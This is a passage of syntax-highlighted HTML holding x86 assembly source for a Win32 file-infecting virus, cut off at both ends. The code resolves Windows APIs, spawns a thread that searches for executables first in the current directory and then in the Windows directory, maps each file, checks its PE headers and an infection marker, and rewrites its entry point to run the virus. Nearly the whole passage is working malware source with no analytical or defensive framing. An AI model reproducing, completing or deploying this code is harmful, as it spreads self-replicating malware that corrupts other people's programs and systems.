                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetMHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetProcAddress</span><span class="sc0">
</span><span class="sc5">GPAddress</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">; Save address</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Get_APIs</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; lpThreadAttributes;dwStackSize;lpStartADress,lPParameter,</span><span class="sc0">
</span><span class="sc1">;dwCreationFlags, lpThreadld</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">THR</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">FindFirstFile</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1000d</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">API_CrThread</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ReturnHost</span><span class="sc0">
</span><span class="sc5">THR</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;epflag:         db      0</span><span class="sc0">

</span><span class="sc1">;----------------------</span><span class="sc0">
</span><span class="sc1">; FindFirst "Host.EXE"</span><span class="sc0">
</span><span class="sc5">FindFirstFile</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Delta4thread</span><span class="sc0">
</span><span class="sc5">Delta4thread</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Delta4thread</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">signal</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">01d</span><span class="sc0">

</span><span class="sc5">FindFirstReal</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Find_Win32_Data</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Search_File</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">API_FindFirst</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">EndReturn</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Infect</span><span class="sc0">

</span><span class="sc5">LoopFindNext</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; Handle for finding</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindNext</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">EndReturn</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Infect</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">LoopFindNext</span><span class="sc0">



</span><span class="sc5">WinDir</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">signal</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc1">; We finished, so we just get out</span><span class="sc0">

</span><span class="sc1">;#########################################################################</span><span class="sc0">
</span><span class="sc1">;               We should now infect the windows directory</span><span class="sc0">
</span><span class="sc1">;#########################################################################</span><span class="sc0">

</span><span class="sc5">EndReturn</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">; We change directory ( now it's windows one )</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">WinDir</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">API_GetWDir</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">WinDir</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">API_SetDir</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">signal</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">signal</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FindFirstReal</span><span class="sc0">

</span><span class="sc5">ExitGame</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">NULL</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">API_ExitThread</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">


                </span><span class="sc1">; FINISH</span><span class="sc0">




</span><span class="sc5">FindNext</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Find_Win32_Data</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">API_FindNext</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; Open "Host.EXE"</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc2">0C0000000h</span><span class="sc0">  </span><span class="sc1">; Read/Write access</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Find_Win32_Data</span><span class="sc4">+</span><span class="sc5">WFD_szFileName</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">API_Create</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">


                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">No_Prob1</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">No_Prob1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;also for open_mapping</span><span class="sc0">

</span><span class="sc1">; CreateFileMapping</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Find_Win32_Data</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">      </span><span class="sc1">; Host plus our size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">      </span><span class="sc1">; R/W</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; Opt_sec_attr</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; Handle</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">API_CMap</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; Save mapping handle</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">No_Prob2</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">badress</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">No_Prob2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; MapViewOfFile</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">FILE_MAP_ALL_ACCESS</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; handle</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">API_MapView</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Close_handles</span><span class="sc0">             </span><span class="sc1">; Does it (???)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">badress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc1">; Base address = eax</span><span class="sc0">


</span><span class="sc1">;///////////////////////////////////////////////////////////////////////////</span><span class="sc0">
</span><span class="sc1">;                      File mapped, infection begins</span><span class="sc0">
</span><span class="sc1">;///////////////////////////////////////////////////////////////////////////</span><span class="sc0">


                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,-(</span><span class="sc12">'M'</span><span class="sc4">+</span><span class="sc12">'Z'</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">unmap_close</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; PE header</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0baafh</span><span class="sc0">                  </span><span class="sc1">; Is PE header ?</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">unmap_close</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0014h</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Optional header exists ?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">unmap_close</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">04ch</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc12">'CHR0'</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">unmap_close</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">016h</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; File is executable</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">unmap_close</span><span class="sc0">

                </span><span class="sc1">; So, we have a suitable file for infection</span><span class="sc0">
                </span><span class="sc1">; Now then calculate beggining of last section</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; SizeofOptional</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; Start of Section Table</span><span class="sc0">

                </span><span class="sc1">; Now that esi = section table, we must search</span><span class="sc0">
                </span><span class="sc1">;which is the last one: that is, looking at the biggest</span><span class="sc0">
                </span><span class="sc1">;PointerToRawData field.</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; number of sections</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">X_Sections</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">02Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the code RVA</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Are they the same ?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">fuckya</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">028h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Substract Entry Point RVA to Code base</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">014h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">badress</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">Start</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UVE</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">fuckya</span><span class="sc0">
                </span><span class="sc1">; Overwrite old instructions with 0s</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4d</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
                </span><span class="sc1">; Activate flag: old ep has to be increased by 5</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">028h</span><span class="sc4">],</span><span class="sc2">5d</span><span class="sc0">
</span><span class="sc5">fuckya</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">


                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Not_Biggest</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Not_Biggest</span><span class="sc4">:</span><span class="sc0">
